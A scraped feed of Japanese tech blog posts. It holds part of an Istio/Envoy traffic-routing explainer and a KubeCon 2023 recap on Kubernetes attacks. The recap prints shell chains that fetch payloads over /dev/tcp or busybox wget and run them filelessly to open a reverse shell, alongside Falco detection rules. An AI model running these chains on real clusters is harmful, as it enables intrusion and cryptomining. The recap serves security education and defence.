☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅      ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          宛先      リスナー      ✅                  ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          ▶︎ 送信元と宛先のNamespaceについてistio-ingress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio IngressGatewayを置くことで、Istio IngressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyでほとんど同じリソースが登場しますが、 Gatewayは送信元Envoyだけで登場します。リソースの種類だけに着目すると、以下になります。Gatewayが送信元Envoyだけで登場することがわかりやすくなりました。マイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから別のPodへのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。GatewayとServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            \xd7      ✅            \xd7      ✅    ルート      ✅            \xd7      ✅            \xd7          クラスター      ✅            \xd7            ✅      \xd7      ✅    エンドポイント            ✅      \xd7            ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          宛先      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで、同じリソースが登場します。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場することがわかりやすくなりました。サービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) へのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio EgressGatewayの一部として使用します。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。他の場合とは異なり、送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。送信元Envoyの設定の抽象化で登場するリソースが宛先では登場せず、逆も然りです。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualServiceX      〃Y      DestinationRuleX      〃Y      ServiceEntry      PeerAuthentication    送信元      リスナー      ✅                  ✅                              ✅    ルート      ✅                  ✅                                  クラスター      ✅                              ✅                  ✅    エンドポイント            ✅                        ✅                      宛先      リスナー                  ✅            ✅                        ✅    ルート                              ✅                            クラスター                                          ✅      ✅      ✅    エンドポイント                                          ✅      ✅          ▶︎ 送信元と宛先のNamespaceについてistio-egress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio EgressGatewayを置くことで、Istio EgressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで同じリソースが登場しません 。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場しないことがわかりやすくなりました。06. 翻訳されたEnvoy設定値を見てみる前章では、Envoyの具体的な設定値まで、言及しませんでした。本章では、さらに具体化します。各リソースの設定の翻訳によって、Envoyの具体的にどのような設定値になっているのかを解説します。Envoyの現在の設定を出力するEnvoyは、現在の設定を確認するためのエンドポイント (/config_dump) を公開しています。これにHTTPSリクエストを送信し、具体的な設定値を出力してみましょう\uD83D\uDC4D\uD83C\uDFFBリスナーを出力する/config_dumpのクエリストリングにresource={dynamic_listeners}をつけると、Envoyのリスナーを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -PAdministration interface — envoy 1.34.0-dev-997cab documentationConfigDump (proto) — envoy 1.34.0-dev-997cab documentation▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dルートを出力する/config_dumpのクエリストリングにresource={dynamic_route_configs}をつけると、Envoyのルートを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -PAdministration interface — envoy 1.34.0-dev-997cab documentationConfigDump (proto) — envoy 1.34.0-dev-997cab documentationクラスターを出力する/config_dumpのクエリストリングにresource={dynamic_active_clusters}をつけると、Envoyのクラスターを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -PAdministration interface — envoy 1.34.0-dev-997cab documentationConfigDump (proto) — envoy 1.34.0-dev-997cab documentationエンドポイントを出力する/config_dumpのクエリストリングにinclude_edsをつけると、Envoyのエンドポイントを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -PAdministration interface — envoy 1.34.0-dev-997cab documentationConfigDump (proto) — envoy 1.34.0-dev-997cab documentationSupported load balancers — envoy 1.34.0-dev-997cab documentation証明書を出力する/config_dumpのクエリストリングにresource={dynamic_active_secrets}をつけると、証明書を出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_secrets}\\" | yq -PConfigDump (proto) — envoy 1.34.0-dev-997cab documentationサービスメッシュ外からのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50000) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50000) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50000||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50000||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50000) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ istio-proxyコンテナのプロキシ先のIPアドレスについてistio-proxyコンテナは、ローカルホストを127.0.0.6とし、HTTPSリクエストをマイクロサービスに送信します。これは、127.0.0.1を指定してしまうと、istio-proxyコンテナからマイクロサービスへの通信がiptables上でループしてしまうためです。istio-proxyコンテナからマイクロサービスへの通信では、正しくはiptables上でISTIO_OUTPUTからPOSTROUTINGに通信を渡します。一方で、もしローカルホストが127.0.0.1であると、ISTIO_OUTPUTからISTIO_IN_REDIRECTに通信を渡すことになり、istio-proxyコンテナに再びリダイレクトしてしまいます。hatappi1225さんの解説が鬼わかりやすかったです\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F画像引用元：mercari engineeringInbound Forwarding - Google ドキュメントiptables から理解する Istio 1.10 から変更された Inbound Forwarding | メルカリエンジニアリングマイクロサービス間のHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50010) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50010) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50010||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50010) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/サービスメッシュ外へのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：443) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：istio-egressgateway-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターをIstio EgressGateway 宛先ポートやホストで管理しています (例：outbound|443|istio-egressgateway-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Istio EgressGateway Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:443) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、Istio EgressGateway PodにL7ロードバランシングします。宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：external.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|443|external.com) 。エンドポイントを選びます。Envoyは、エンドポイントをエントリ済システムのIPアドレスや宛先ポートで管理しています (例：:50010) 。エントリ済システムのIPアドレスは、開発者が設定する必要はなく、EnvoyがDNSから動的に取得します。  エントリ済システムにHTTPSリクエストを送信します。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio07. おわりにIstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのか、またEnvoyがどのようにHTTPSリクエストを処理するのかを解説しました。次々とサービスメッシュツールが登場したとしても、それがEnvoyを使用したサービスメッシュである限り、最終的にはEnvoyの設定値に行き着きます。そのため、抽象化されたEnvoyがどのように通信を扱うのかを一度でも理解すれば、様々なサービスメッシュツールで知識を流用できると思います。Istioはもちろん、他のEnvoyによるサービスメッシュツール (Consul、Ciliumなど) を使っている方の参考にもなれば幸いです\uD83D\uDC4D\uD83C\uDFFB謝辞今回、Kubernetesのネットワークを調査するにあたり、以下の方に知見をご教授いただきました。@ken5owata さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2024-01-15T16:34:04.000Z","dateMiliSeconds":1705336444000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"k8sgpt-operator 開発メモ (ARM Mac 向け)","link":"https://zenn.dev/tozastation/articles/711f2bff2cc656","contentSnippet":"Kubernetes クラスタ構築 AMD64 コンテナ環境セットアップ ~ Lima VM ~https://github.com/lima-vm/limaGetting Started については README.md 参照Limaでは、事前に定義した内容でVMを作ることができますDocker 環境を構築する場合のサンプルも公開されていますhttps://github.com/lima-vm/lima/blob/master/examples/docker.yaml今回は、amd64 の VM を作成したいため、docker.yaml に以下の行を追記...","isoDate":"2024-01-10T00:17:57.000Z","dateMiliSeconds":1704845877000,"authorName":"tozastation","authorId":"tozastation"},{"title":"WSL の Linux から Windows のブラウザで URL を開く","link":"https://blog.1q77.com/2024/01/open-browser-in-wsl/","contentSnippet":"課題WSL の Linux 内で awscli を使って SSO 認証する場合の aws sso login 実行時や GitHub の CLI である gh (cli.github.com ) コマンドで gh auth login を実行した場合に可能であれば自動でブラウザで指定の URL が開かれますが、WSL の場合、Linux 内のブラウザを使うわけではないため何も設定していない状態だと開いてくれないのでひと手間かかって面倒です。","isoDate":"2024-01-07T11:43:53.000Z","dateMiliSeconds":1704627833000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の振り返りをする","link":"https://nnaka2992.hatenablog.com/entry/zatu/2023_furikaeri","contentSnippet":"みんな振り返りしてる。振り返りしてないのはお前だけ。なので振り返りします。登壇関係2023-06-22 3-shake SRE Tech Talk #6これまで対外向けの登壇は行なったことが無かったのでこれが登壇デビューでした。DBREノススメ所属会社である株式会社スリーシェイクの主催するイベントでしたが、一度登壇すると登壇のハードルが低くなるのでとてもいい機会でした。今の会社にDBREerポジションで入社して6か月目の登壇なので今見ると当時と違う意見の部分もあったりしますが、今もDBREもSREも何なのか分かりません。2023-09-26 YugabyteDB Japan Meetup #3別件でYugabyte Japanの方と話していたところ、登壇してみないか？ と誘われたためホイホイ話しに行った登壇でした。紹介 データベース信頼性エンジニアリングSRETTの方ではSREの存在を認知している方が多いだろうと想定して何故DBREが必要なのか？ という話しをしたのに対して、こちらではDB関係者が多いと想いDBAとDBREという切り口で発表しました。YugabyteDBはドキュメントを始めから読む活動をしていたり(2023年後半はあまり出来ていませんが)、ローカル環境で動かして遊んだりはしていたもののYugabyteDBについて話せるほどの理解は(今も)なく次にYugabyteDB Japan Meetupで話す機会があればYugabyteDBについてを主題に話したいと思いました。2023-10-12 3-shake SRE Tech Talk #76月の登壇と同様に所属会社主催のイベントでした。KubernetesでDBを動かしたい2021年ごろにDBをKubernetesで動かす記事見て以来DB on Kubernetesには興味があったのですが、Kubernetes自体やデータベースのお勉強をしていたらなかなかDB on k8sまでたどりつけていませんでした。それをイベント駆動で無理やり勉強したのがこのイベントでした。内容としてはありきたりですが、Zalando Postgres Operatorを動かしましたというだけのものですが、ここでDB on k8sをさわってからはいろいろな機会でDB on k8sを触るようになりました。2023-12-26 第44回 PostgreSQLアンカンファレンス@オンライン年内最後の登壇はPostgreSQLアンカンファレンスでした。pgrollで実現するスキーマブルーグリーンデプロイメントちょうど登壇しやすいネタを抱えてたのとアドベントカレンダーでそーだいさんが運用・開発よりの話しが足りないと書いていたのを見て、DBREを名乗っているし話さなきゃいけないだろと思ったので登壇しました。もっと運用よりだったりサービス開発だったり設計よりの話も募集中です。 大体そういうの喋る担当が自分だけなのでめちゃめちゃ需要があるので気軽にどうぞ。登壇自体はpodman-composeとdocker composeの差分で悲しいライブデモになりました。検証環境と登壇環境はそろえなきゃいけないなと思いました。ブログ関連はてなブログでは主に読んだ論文やドキュメントについてまとめ、zennでは何かを調べてまとめたものや検証した結果をまとめるように使い分け運用しました。はてなブログでやっているYugabyteDBのドキュメントを全部読む取り組みは途中で止ってしまっているので動かします。zennの方は社内向けに話すもののうち社外に出しても問題ないようなものを垂れ流していましす。2024年は技術検証方面に力をいれたいのでzennを活発に出来たらなと思います。アドベントカレンダーは大風呂敷で畳みきれなかったデータベースエンジニアのためのDB on Kubernetes入門ガイドに始まり、誰得なのかわからないAlloyDB omni on Kubernetesを眺めると続いて、sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメントを書きました。ターゲットは誰だったんですかね？まとめ2023年は今までインプット重視だったところからアウトプットを考えだした年でした。これはそろそろアウトプットをしなきゃいけないという思いもあったものの、2023年1月に現職に転職し社外へのアウトプットをする人が多くいたからという面も多大にあります。人は周りの5人の平均になるという言葉があるらしいですが、まさしくその例で環境が変り周りの人が変ったため個人の方向性も変ったのではないかと思います。外部にアウトプットすることが偉いわけではありませんが、外部に発信すると新しい機会も産まれましたし1来年以降も継続していきたいです。↩","isoDate":"2023-12-31T13:00:10.000Z","dateMiliSeconds":1704027610000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2023 Recap: Attacking Kubernetes 編","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","contentSnippet":"本記事は 3-shake Advent Calendar 2023 最終日の記事です。こんにちは、きょー (@kyohmizu) です少し旬を逃してしまいましたが、KubeCon NA 2023 の振り返りをしたいと思います。私はKubeConにはリアル参加しておらず、後からセッション動画を見ました。Kubernetes 編」ということで、Kubernetes へのサイバー攻撃テクニックに関するセッションを3つご紹介します。ちなみに本内容は、先日開催された CloudNative Days Tokyo 2023 にてお話しするか検討していたのですが、準備期間とセッション時間 (20分) の都合で泣く泣く諦めたものになります。 speakerdeck.comそれではセッション紹介に入ります。K8s Post-Exploitation: Privilege Escalation, Sidecar Container Injection, and Runtime Securityセッション情報Kubernetes クラスタに侵入した攻撃者が行う攻撃手法と、その対策を紹介するセッションです。最初に TeamTNT の行った攻撃キャンペーンについて、過去の調査レポートをベースに説明しています。クラスタへの初期アクセスの後、kubelet API のデフォルトポート (10250) を狙ってネットワークスキャンをかけています。スキャンによって kubelet API を発見した場合、kubelet API にPOSTリクエストを送り、最終的にノード内の全コンテナに対しクリプトマイナーをダウンロードします。詳細は調査レポートを参照いただきたいですが、攻撃コードを見るとどのように攻撃が行われるのかイメージしやすいと思います。この攻撃はアプリコンテナ内でクリプトマイナーを実行するため、早期に発見されてしまう可能性があります。そこでより発見されにくい攻撃手法として、セッション後半では「Sidecar Injection 攻撃」を取り上げています。Sidecar Injection 攻撃 は Microsoft の「Threat Matrix for Kubernetes」で紹介されている攻撃テクニックです。ちなみに MITRE ATT&CK の Containers Matrix にはこのテクニックは含まれていません。Sidecar Injection 攻撃は名前の通り、Pod 内のサイドカーコンテナを標的とします。セッション内で攻撃のサンプルコードが公開されていましたが、Pod 内のサイドカーコンテナのみを選択しクリプトマイナーを実行することを目的としているようでした。個人的にあまりピンと来なかったのは、アプリコンテナではなくサイドカーコンテナを狙うことで本当に攻撃を秘匿できるのか？という点です。サイドカーかはあまり関係ない気がします。そして最後に、これらの攻撃に対するセキュリティ対策について説明しています。Kubernetes セキュリティとして、イメージスキャンアドミッションコントロールランタイムセキュリティの3つのカテゴリを挙げ、実行中のコンテナに対する攻撃にはランタイムセキュリティが有効であると述べています。Falco を取り上げ、今回の攻撃に対する Falco ルールも公開されました。- list: shell_binaries  items: [bash, csh, ksh, sh, tcsh, zsh, dash]- macro: shell_procs  condition: proc.name in (shell_binaries)- rule: shell_in_container  desc: notice shell activity within a container  condition: >    spawned process and    container and    shell_procs  output: >    shell in a container    (user=%user.name container_id=%container.id container_name=%container.name    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)  priority: WARNINGArbitrary Code & File Execution in R/O FS – Am I Write?セッション情報readOnlyRootFilesystem: true が設定されたコンテナにおいて、コンテナ内で攻撃コードを実行するテクニックを3つ紹介しています。Readonly Filesystem では、ファイルの読み込み (Read) と実行 (Execute) はできるが書き込み (Write) ができないという特徴があります。マルウェアを配置したりすることを防止します。ファイルレスマルウェアの攻撃も存在しますが、コンテナ内に curl や wget のようなツールが含まれていなければマルウェアをダウンロードできません。それではセッション内の3つのケースについて見ていきます。ここではすべてを紹介しきれないため、より詳しく知りたい方は動画を見たりツールを調べたりしてみてください。ケース1curl や wget のようなネットワークツールがない場合、どのように攻撃コードのファイルをダウンロードするのでしょうか？/dev/tcp を利用して TCP コネクションを確立し、ファイルをダウンロードしています。ただしダウンロードしたファイルを書き込むことはできないため、メモリ上で直接実行する必要があります。これには DDExec を使い、プロセスをハイジャックすることでファイルレス実行を可能にします。$ function __bindown () {  read proto server path <<<$(echo ${1//// })  FILE=/${path// //}  HOST-${server//:*}  PORT=${server//*:}  [[ x\\"$(HOST)\\" == x\\"${PORT}\\" ]] && PORT=8080  exec 3<>/dev/tcp/${HOST]/$PORT  echo -en \\"GET ${(FILE) HTTP/1.0\\\\r\\\\nHost: $(HOST)\\\\r\\\\n\\\\r\\\\n\\" >&3  (while read line; do  [[ \\"$line\\" == $\'\\\\r\' ]] && break  done && cat) <&3  exec 3>&-}$ __bindown http://192.168.88.4:8080/shell.b64 | bash <(__bindown http://192.168.88.4:8080/ddexec.sh)base64 エンコードした攻撃用バイナリと ddexec.sh をそれぞれダウンロードし、ddexec.sh は bash で実行します。ケース2今回はコンテナイメージとして alpine を利用しています (ケース1は nginx でした)。alpine には bash が存在せず、/dev/tcp をそのまま実行することができないため、別の方法でファイルのダウンロードを試みます。curl や wget は存在しませんが、alpine には busybox がインストールされています。ファイルのダウンロードには busybox wget を利用し、ダウンロード先には Readonly RootFS の中でも書き込み可能な tmpfs を選択しています。$ mount | grep shmshm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)バイナリコードを直接実行できる ddsc.sh をダウンロードし、/dev/shm に保存します。noexec でマウントされているためファイルの実行はできませんが、ddsc.sh はシェルスクリプトなので sh から実行可能です。$ dde=$(mktemp -p /dev/shm)$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/ddsc.sh > $dde$ code=$(mktemp -p /dev/shm)$ echo \\"6a295899...60f05\\" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith \\"/dev/shm/\\" or    (proc.cwd startswith \\"/dev/shm/\\" and proc.exe startswith \\"./\\" ) or    (shell_procs and proc.args startswith \\"-c /dev/shm\\") or    (shell_procs and proc.args startswith \\"-i /dev/shm\\") or    (shell_procs and proc.args startswith \\"/dev/shm\\") or    (proc.args contains \\"/dev/shm\\" or proc.cwd startswith \\"/dev/shm\\") or    (proc.cwd startswith \\"/dev/shm/\\" and proc.args startswith \\"./\\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \\"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\\"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \\"3600\\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin 